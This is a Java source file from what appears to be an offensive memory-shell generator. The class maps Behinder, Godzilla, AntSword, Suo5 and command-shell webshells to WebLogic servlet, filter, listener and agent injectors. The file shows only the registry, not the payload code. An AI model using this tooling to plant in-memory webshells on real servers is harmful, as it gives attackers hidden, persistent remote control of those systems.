package com.reajason.javaweb.memshell;

import com.reajason.javaweb.memshell.shelltool.antsword.AntSwordFilter;
import com.reajason.javaweb.memshell.shelltool.antsword.AntSwordFilterChainAdvisor;
import com.reajason.javaweb.memshell.shelltool.antsword.AntSwordServlet;
import com.reajason.javaweb.memshell.shelltool.behinder.BehinderFilter;
import com.reajason.javaweb.memshell.shelltool.behinder.BehinderFilterChainAdvisor;
import com.reajason.javaweb.memshell.shelltool.behinder.BehinderServlet;
import com.reajason.javaweb.memshell.shelltool.command.CommandFilter;
import com.reajason.javaweb.memshell.shelltool.command.CommandFilterChainAdvisor;
import com.reajason.javaweb.memshell.shelltool.command.CommandServlet;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaFilter;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaFilterChainAdvisor;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaServlet;
import com.reajason.javaweb.memshell.shelltool.suo5.Suo5Filter;
import com.reajason.javaweb.memshell.shelltool.suo5.Suo5Servlet;
import com.reajason.javaweb.memshell.weblogic.antsword.AntSwordListener;
import com.reajason.javaweb.memshell.weblogic.behinder.BehinderListener;
import com.reajason.javaweb.memshell.weblogic.command.CommandListener;
import com.reajason.javaweb.memshell.weblogic.godzilla.GodzillaListener;
import com.reajason.javaweb.memshell.weblogic.injector.WebLogicFilterInjector;
import com.reajason.javaweb.memshell.weblogic.injector.WebLogicListenerInjector;
import com.reajason.javaweb.memshell.weblogic.injector.WebLogicServletContextAgentInjector;
import com.reajason.javaweb.memshell.weblogic.injector.WebLogicServletInjector;
import com.reajason.javaweb.memshell.weblogic.suo5.Suo5Listener;
import org.apache.commons.lang3.tuple.Pair;

import java.util.LinkedHashMap;
import java.util.Map;

import static com.reajason.javaweb.memshell.config.Constants.*;

/**
 * @author ReaJason
 * @since 2024/12/24
 */
public class WebLogicShell extends AbstractShell {
    public static final String AGENT_SERVLET_CONTEXT = AGENT + "ServletContext";

    @Override
    protected Map<String, Pair<Class<?>, Class<?>>> getBehinderShellMap() {
        Map<String, Pair<Class<?>, Class<?>>> map = new LinkedHashMap<>();
        map.put(SERVLET, Pair.of(BehinderServlet.class, WebLogicServletInjector.class));
        map.put(FILTER, Pair.of(BehinderFilter.class, WebLogicFilterInjector.class));
        map.put(LISTENER, Pair.of(BehinderListener.class, WebLogicListenerInjector.class));
        map.put(AGENT_SERVLET_CONTEXT, Pair.of(BehinderFilterChainAdvisor.class, WebLogicServletContextAgentInjector.class));
        return map;
    }

    @Override
    protected Map<String, Pair<Class<?>, Class<?>>> getCommandShellMap() {
        Map<String, Pair<Class<?>, Class<?>>> map = new LinkedHashMap<>();
        map.put(SERVLET, Pair.of(CommandServlet.class, WebLogicServletInjector.class));
        map.put(FILTER, Pair.of(CommandFilter.class, WebLogicFilterInjector.class));
        map.put(LISTENER, Pair.of(CommandListener.class, WebLogicListenerInjector.class));
        map.put(AGENT_SERVLET_CONTEXT, Pair.of(CommandFilterChainAdvisor.class, WebLogicServletContextAgentInjector.class));
        return map;
    }

    @Override
    protected Map<String, Pair<Class<?>, Class<?>>> getGodzillaShellMap() {
        Map<String, Pair<Class<?>, Class<?>>> map = new LinkedHashMap<>();
        map.put(SERVLET, Pair.of(GodzillaServlet.class, WebLogicServletInjector.class));
        map.put(FILTER, Pair.of(GodzillaFilter.class, WebLogicFilterInjector.class));
        map.put(LISTENER, Pair.of(GodzillaListener.class, WebLogicListenerInjector.class));
        map.put(AGENT_SERVLET_CONTEXT, Pair.of(GodzillaFilterChainAdvisor.class, WebLogicServletContextAgentInjector.class));
        return map;
    }

    @Override
    protected Map<String, Pair<Class<?>, Class<?>>> getSuo5ShellMap() {
        Map<String, Pair<Class<?>, Class<?>>> map = new LinkedHashMap<>();
        map.put(SERVLET, Pair.of(Suo5Servlet.class, WebLogicServletInjector.class));
        map.put(FILTER, Pair.of(Suo5Filter.class, WebLogicFilterInjector.class));
        map.put(LISTENER, Pair.of(Suo5Listener.class, WebLogicListenerInjector.class));
        return map;
    }

    @Override
    protected Map<String, Pair<Class<?>, Class<?>>> getAntSwordShellMap() {
        Map<String, Pair<Class<?>, Class<?>>> map = new LinkedHashMap<>();
        map.put(SERVLET, Pair.of(AntSwordServlet.class, WebLogicServletInjector.class));
        map.put(FILTER, Pair.of(AntSwordFilter.class, WebLogicFilterInjector.class));
        map.put(LISTENER, Pair.of(AntSwordListener.class, WebLogicListenerInjector.class));
        map.put(AGENT_SERVLET_CONTEXT, Pair.of(AntSwordFilterChainAdvisor.class, WebLogicServletContextAgentInjector.class));
        return map;
    }
}
